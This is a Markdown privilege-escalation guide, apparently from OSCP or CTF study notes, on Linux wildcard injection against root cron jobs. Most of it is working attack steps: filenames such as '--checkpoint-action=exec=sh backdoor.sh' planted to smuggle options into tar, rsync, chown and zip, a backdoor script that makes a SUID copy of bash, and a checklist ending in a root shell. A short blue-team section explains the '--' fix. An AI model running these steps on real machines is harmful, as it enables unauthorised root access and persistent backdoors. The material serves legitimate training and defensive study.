# 14 — Wildcard Injection

## Overview

Many Linux commands (`tar`, `rsync`, `chown`, `chmod`, `zip`) accept flags like `--checkpoint-action` or `-rf` that, when combined with a wildcard (`*`) in a shell command, can be tricked into treating a **filename** as a **command-line flag**. If a privileged script or cron job uses a wildcard to operate on a directory you can write to, you can plant specially-named files that get interpreted as options — leading to arbitrary code execution as the privileged user.

```
Root script runs: tar -czf backup.tar.gz *
You control the directory → you create files named like flags → tar misinterprets them → code execution as root
```

This is a documented GTFOBins technique category and one of the most common real-world privesc paths in CTF and OSCP-style boxes.

---

## Step 1 — Find the Vulnerable Pattern

Look for cron jobs or scripts that use a wildcard (`*`) inside a directory you can write to:

```bash
cat /etc/crontab
crontab -l
ls -la /etc/cron.d/
```

**Vulnerable example found in a cron job:**
```bash
# /etc/cron.d/backup
* * * * * root cd /home/backups && tar -czf /tmp/backup.tar.gz *
```
**Breakdown:**
- `cd /home/backups` = changes into a directory
- `tar -czf /tmp/backup.tar.gz *` = the `*` expands via shell glob to every file/directory inside `/home/backups`
- If `/home/backups` is writable by your user, you control what `*` expands to

```bash
ls -la /home/backups
```
Confirm write access:
```
drwxrwxrwx 2 root root ... /home/backups
```

---

## Step 2 — Understand the GTFOBins Wildcard Trick

GTFOBins documents special "flag-filenames" for common tools. The core idea: a filename starting with `-` or `--` gets interpreted by the target binary as an **option**, not a file to archive/copy/chown.

### tar — Checkpoint Action (Most Common)

```bash
cd /home/backups

echo '' > "--checkpoint=1"
echo '' > "--checkpoint-action=exec=sh backdoor.sh"

cat > backdoor.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x backdoor.sh
```
**Breakdown:**

| Part | Meaning |
|------|---------|
| `"--checkpoint=1"` | An empty file literally named `--checkpoint=1` — when `tar *` expands, this filename is passed to tar as if it were a real flag |
| `--checkpoint=1` (as tar flag) | Tells tar to trigger a "checkpoint" after every 1 file processed |
| `"--checkpoint-action=exec=sh backdoor.sh"` | Another fake filename — tar interprets this as: on each checkpoint, execute `sh backdoor.sh` |
| `backdoor.sh` | Our payload — copies bash and sets SUID, runs AS ROOT because tar itself runs as root (via cron) |

When root's cron job runs `tar -czf /tmp/backup.tar.gz *`, the shell expands `*` to include our fake-flag filenames, in alphabetical/glob order, so tar sees:
```bash
tar -czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh backdoor.sh backdoor.sh
```
Tar executes `backdoor.sh` as root during the checkpoint action.

```bash
# Wait for cron to fire (up to 1 minute if */1 * * * *)
ls -la /tmp/rootbash
/tmp/rootbash -p
id
# uid=0(root)
```

### rsync — Execute via -e (Remote Shell Flag)

If a root cron job does `rsync -a * backupserver:/backups/`:

```bash
echo '' > "-e sh backdoor.sh"
```
**Breakdown:**
- `-e` = normally specifies which remote-shell program rsync should use (defaults to ssh)
- A fake filename `-e sh backdoor.sh` gets parsed as `-e sh backdoor.sh`, making rsync treat `sh backdoor.sh` as the "remote shell command" — which it then executes locally as part of its invocation

### chown — Recursive Ownership Change Abuse

If a root cron job runs `chown -R user:user *` inside a writable directory, you can abuse the `--reference` flag:

```bash
touch "--reference=/etc/passwd"
```
**Breakdown:**
- `--reference=FILE` = tells chown to copy ownership FROM the referenced file, instead of using the user:group given on the command line
- This lets you redirect the ownership change operation, though this specific vector is more useful for leaking ownership info than direct code execution — combine with other writable files for real impact

### zip — Unzip-based Execution

```bash
echo '' > "-TT"
echo '' > "-unzip=/tmp/payload.sh"
```
Check GTFOBins `zip` entry for the exact current syntax — it changes between zip/unzip versions.

---

## Step 3 — Confirm Execution

```bash
# After the cron job fires
ls -la /tmp/rootbash
file /tmp/rootbash
/tmp/rootbash -p
id
whoami
```

---

## Why This Works (Conceptually)

- The shell's wildcard (`*`) expansion happens **before** the command is executed — it's a shell feature, not a tar/rsync/chown feature
- These tools have no way to distinguish "a file that happens to be named like a flag" from "an actual flag" when the shell hands them an already-expanded argument list
- This is **not a bug in tar/rsync/chown** — it's inherent to how Unix argument parsing and shell globbing interact, which is why it recurs across so many different tools

---

## Detection / Hardening Notes (Blue Team)

```bash
# Always use explicit paths instead of wildcards in privileged scripts
tar -czf backup.tar.gz ./*          # still vulnerable
tar -czf backup.tar.gz -- *         # '--' tells tar "no more flags after this" - SAFER

# Best practice: list files explicitly or restrict directory write access
find /home/backups -maxdepth 1 -type f -print0 | tar -czf backup.tar.gz --null -T -
```
**Breakdown of the fix:** The `--` argument is the real protection — it's a POSIX convention meaning "everything after this is a filename, never a flag," which neutralizes the entire wildcard injection class.

---

## Practice

Extremely common in OSCP-style boxes. Trigger: any cron job or root-run script you find that uses an unquoted `*` inside a directory where you have write access. Always check `crontab -l`, `/etc/crontab`, and `/etc/cron.d/*` for this pattern as part of routine enumeration (ties directly into `03-cron-job-abuse.md`).

---

## Quick Checklist

```
[ ] cat /etc/crontab && ls -la /etc/cron.d/            → find scripts using wildcards
[ ] grep -r '\*' /etc/cron* 2>/dev/null                → search specifically for wildcard usage
[ ] ls -la <target_directory>                           → confirm write access
[ ] echo '' > "--checkpoint=1"                          → plant fake tar flag file
[ ] echo '' > "--checkpoint-action=exec=sh backdoor.sh" → plant action-trigger file
[ ] write backdoor.sh (cp /bin/bash /tmp/rootbash; chmod +s)
[ ] chmod +x backdoor.sh
[ ] wait for cron trigger
[ ] /tmp/rootbash -p                                     → spawn root shell
[ ] id                                                    → confirm root
```
